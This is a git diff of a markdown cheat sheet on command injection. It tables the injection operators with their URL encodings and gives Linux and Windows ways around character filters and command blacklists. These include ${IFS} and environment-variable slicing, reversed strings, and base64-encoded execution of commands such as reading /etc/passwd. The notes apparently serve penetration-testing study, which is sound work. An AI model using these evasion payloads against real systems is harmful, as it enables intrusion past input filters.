@@ -1,8 +1,11 @@
 # Command Injections
 
+[PayloadAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+
 ## Injection Operators
+
 | Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
-|-------------------|---------------------|-----------------------|------------------|
+|--------------------|---------------------|-----------------------|------------------|
 | Semicolon | ; | %3b | Both |
 | New Line | \n | %0a | Both |
 | Background | & | %26 | Both (second output generally shown first) |
@@ -13,20 +16,23 @@
 | Sub-Shell | $() | %24%28%29 | Both (Linux-only) |
 
 ## Linux
+
 ### Filtered Character Bypass
+
 | Code | Description |
 |------|-------------|
 | `printenv` | Can be used to view all environment variables |
 | **Spaces** | |
 | `%09` | Using tabs instead of spaces |
 | `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
-| `{ls,-la}` | Commas will be replaced with spaces |
+| `{ls,-la}` | Bash brace exspansion (commas will be replaced with spaces) |
 | **Other Characters** | |
 | `${PATH:0:1}` | Will be replaced with / |
 | `${LS_COLORS:10:1}` | Will be replaced with ; |
-| `$(tr '!-}' '"-~'<<<[)` | Shift character by one ([ -> \) |
+| `$(tr '!-}' '"-~'<<<[)` | Shift character by one "[" (91) -> "\\" (92) |
 
 ### Blacklisted Command Bypass
+
 | Code | Description |
 |------|-------------|
 | **Character Insertion** | |
@@ -39,11 +45,13 @@
 | `echo 'whoami' | rev` | Reverse a string |
 | `$(rev<<<'imaohw')` | Execute reversed command |
 | **Encoded Commands** | |
-| `echo -n 'cat /etc/passwd | grep 33' | base64` | Encode a string with base64 |
+| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |
 
 ## Windows
+
 ### Filtered Character Bypass
+
 | Code | Description |
 |------|-------------|
 | `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
@@ -56,6 +64,7 @@
 | `$env:HOMEPATH[0]` | Will be replaced with \ - (PowerShell) |
 
 ### Blacklisted Command Bypass
+
 | Code | Description |
 |------|-------------|
 | **Character Insertion** | |
@@ -68,4 +77,5 @@
 | `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
 | **Encoded Commands** | |
 | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
+| `echo -n whoami \| iconv -f utf-8 -t utf-16le \| base64` | Base 64 encode with linux to be decoded on windows |
 | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |
